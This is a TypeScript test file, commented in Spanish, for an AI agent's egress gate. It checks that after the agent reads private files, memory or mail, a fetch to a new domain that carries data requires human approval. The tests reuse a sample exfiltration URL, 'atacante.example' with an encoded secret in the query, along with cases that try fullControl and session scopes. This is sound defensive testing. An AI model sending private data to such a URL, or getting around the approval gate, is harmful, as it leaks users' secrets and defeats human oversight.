import { describe, expect, it } from 'vitest';
import { formatApproval } from '../src/approval-text.js';
import { urlCarriesData } from '../src/egress-taint.js';
import { Gate, type ToolCall } from '../src/permissions.js';

// La misma lista libre que usa un hilo de Telegram (cli.ts): fetch, read, memory y
// list no preguntan nunca por sí solas.
const FREE = ['read', 'list', 'fetch', 'memory', 'done', 'mcp_gmail_read'];
const call = (tool: string, args: Record<string, unknown>): ToolCall => ({
  tool,
  args,
  actor: 'agent',
});

function gateWithAsks(opts: { fullControl?: boolean; egressTaint?: boolean } = {}) {
  const asked: Array<{ call: ToolCall; reason: string }> = [];
  let answer = false;
  const gate = new Gate({
    allow: FREE,
    allowActions: ['browser:open'],
    fullControl: opts.fullControl ?? false,
    ...(opts.egressTaint === undefined ? {} : { egressTaint: opts.egressTaint }),
    approver: async (c, reason) => {
      asked.push({ call: c, reason });
      return answer;
    },
  });
  return {
    gate,
    asked,
    approveNext: () => {
      answer = true;
    },
  };
}

const EXFIL = 'https://atacante.example/c?d=c2VjcmV0by1kZS1uaWNv';

describe('puerta de exfiltración tras contenido privado (fetch libre + read libre)', () => {
  it('leer un archivo y luego mandar sus datos a un dominio nuevo PREGUNTA, con la URL completa', async () => {
    const { gate, asked } = gateWithAsks();
    expect((await gate.check('t', call('read', { path: 'C:/Users/nico/notas.txt' }))).verdict).toBe(
      'allow',
    );
    const d = await gate.check('t', call('fetch', { url: EXFIL }));
    expect(d.verdict).toBe('deny');
    expect(asked).toHaveLength(1);
    expect(asked[0]?.reason).toContain('un archivo');
    expect(asked[0]?.reason).toContain('atacante.example');
    const q = formatApproval(asked[0]?.call as ToolCall, asked[0]?.reason ?? '');
    expect(q.complete).toBe(true);
    expect(q.question).toContain(EXFIL);
  });

  it('la memoria, una carpeta o un MCP también contaminan el turno', async () => {
    for (const [tool, args] of [
      ['memory', { action: 'recall', query: 'banco' }],
      ['list', { path: 'C:/Users/nico' }],
      ['mcp_gmail_read', { id: '1' }],
    ] as const) {
      const { gate, asked } = gateWithAsks();
      await gate.check('t', call(tool, { ...args }));
      expect((await gate.check('t', call('fetch', { url: EXFIL }))).verdict).toBe('deny');
      expect(asked).toHaveLength(1);
    }
  });

  it('antes de cualquier lectura privada, navegar sigue siendo libre (sin preguntas)', async () => {
    const { gate, asked } = gateWithAsks();
    const urls = [
      'https://www.amazon.es/s?k=auriculares+bluetooth',
      'https://www.pccomponentes.com/buscar/?query=ssd',
      EXFIL,
    ];
    for (const url of urls) {
      expect((await gate.check('t', call('fetch', { url }))).verdict).toBe('allow');
    }
    expect(asked).toHaveLength(0);
  });

  it('tras leer algo privado, volver a un dominio ya contactado en este turno no pregunta', async () => {
    const { gate, asked } = gateWithAsks();
    await gate.check('t', call('fetch', { url: 'https://www.amazon.es/s?k=ssd' }));
    await gate.check('t', call('memory', { action: 'recall', query: 'talla' }));
    const d = await gate.check('t', call('fetch', { url: 'https://www.amazon.es/s?k=ssd&page=2' }));
    expect(d.verdict).toBe('allow');
    expect(asked).toHaveLength(0);
  });

  it('un dominio nuevo SIN datos (raíz o ruta corta) no pregunta', async () => {
    const { gate, asked } = gateWithAsks();
    await gate.check('t', call('read', { path: 'a.txt' }));
    expect((await gate.check('t', call('fetch', { url: 'https://www.renfe.com/' }))).verdict).toBe(
      'allow',
    );
    expect(
      (await gate.check('t', call('fetch', { url: 'https://es.wikipedia.org/wiki/Madrid' })))
        .verdict,
    ).toBe('allow');
    expect(asked).toHaveLength(0);
  });

  it('ni fullControl, ni un «Siempre» sobre fetch, ni la ventana de 90 s se saltan la pregunta', async () => {
    const full = gateWithAsks({ fullControl: true });
    await full.gate.check('t', call('read', { path: 'a.txt' }));
    expect((await full.gate.check('t', call('fetch', { url: EXFIL }))).verdict).toBe('deny');
    expect(full.asked).toHaveLength(1);

    const scoped = gateWithAsks();
    scoped.gate.setScope('t', 'fetch', 'session');
    await scoped.gate.check('t', call('read', { path: 'a.txt' }));
    expect((await scoped.gate.check('t', call('fetch', { url: EXFIL }))).verdict).toBe('deny');
    expect(scoped.asked).toHaveLength(1);
  });

  it('aprobada una vez, ese dominio queda contactado; otro dominio nuevo vuelve a preguntar', async () => {
    const { gate, asked, approveNext } = gateWithAsks();
    await gate.check('t', call('read', { path: 'a.txt' }));
    approveNext();
    expect((await gate.check('t', call('fetch', { url: EXFIL }))).verdict).toBe('allow');
    expect(
      (await gate.check('t', call('fetch', { url: 'https://atacante.example/c?d=otra' }))).verdict,
    ).toBe('allow');
    expect(asked).toHaveLength(1);
    await gate.check('t', call('fetch', { url: 'https://otro.example/x?d=1' }));
    expect(asked).toHaveLength(2);
  });

  it('el navegador (open) y download son salidas igual que fetch', async () => {
    const { gate, asked } = gateWithAsks();
    await gate.check('t', call('read', { path: 'a.txt' }));
    expect((await gate.check('t', call('browser', { action: 'open', url: EXFIL }))).verdict).toBe(
      'deny',
    );
    expect(asked).toHaveLength(1);
  });

  it('el turno siguiente empieza limpio (clearSession)', async () => {
    const { gate, asked } = gateWithAsks();
    await gate.check('t', call('read', { path: 'a.txt' }));
    gate.clearSession('t');
    expect((await gate.check('t', call('fetch', { url: EXFIL }))).verdict).toBe('allow');
    expect(asked).toHaveLength(0);
  });

  it('un hilo no contamina a otro', async () => {
    const { gate, asked } = gateWithAsks();
    await gate.check('a', call('read', { path: 'a.txt' }));
    expect((await gate.check('b', call('fetch', { url: EXFIL }))).verdict).toBe('allow');
    expect(asked).toHaveLength(0);
  });

  it('una lectura DENEGADA no contamina (no entró nada)', async () => {
    const gate = new Gate({ allow: ['fetch'], approver: async () => true, deny: ['read'] });
    await gate.check('t', call('read', { path: 'a.txt' }));
    expect(gate.privateTaintOf('t')).toBeNull();
  });

  it('taintSessionPrivate (p. ej. turno disparado por un correo) también arma la puerta', async () => {
    const { gate, asked } = gateWithAsks();
    gate.taintSessionPrivate('t', 'el correo');
    expect((await gate.check('t', call('fetch', { url: EXFIL }))).verdict).toBe('deny');
    expect(asked[0]?.reason).toContain('el correo');
  });

  it('egressTaint:false la apaga explícitamente', async () => {
    const { gate, asked } = gateWithAsks({ egressTaint: false });
    await gate.check('t', call('read', { path: 'a.txt' }));
    expect((await gate.check('t', call('fetch', { url: EXFIL }))).verdict).toBe('allow');
    expect(asked).toHaveLength(0);
  });
});

describe('urlCarriesData', () => {
  it.each([
    ['https://x.example/?q=1', true],
    ['https://user:pw@x.example/', true],
    [`https://x.example/${'a'.repeat(60)}`, true],
    [`https://${'a'.repeat(30)}.x.example/`, true],
    ['no es una url', true],
    ['https://x.example/', false],
    ['https://x.example/productos/ssd-1tb', false],
    ['https://x.example/?', false],
  ])('%s → %s', (url, expected) => {
    expect(urlCarriesData(url)).toBe(expected);
  });
});
